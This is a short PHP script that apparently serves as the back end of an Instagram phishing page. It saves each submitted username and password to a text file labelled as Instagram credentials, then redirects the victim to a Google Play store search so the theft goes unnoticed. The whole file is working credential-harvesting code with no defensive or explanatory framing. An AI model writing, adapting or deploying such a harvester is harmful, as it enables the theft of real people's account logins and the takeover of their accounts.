<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://play.google.com/store/search?q=herorickystudios&c=apps');
exit();
?>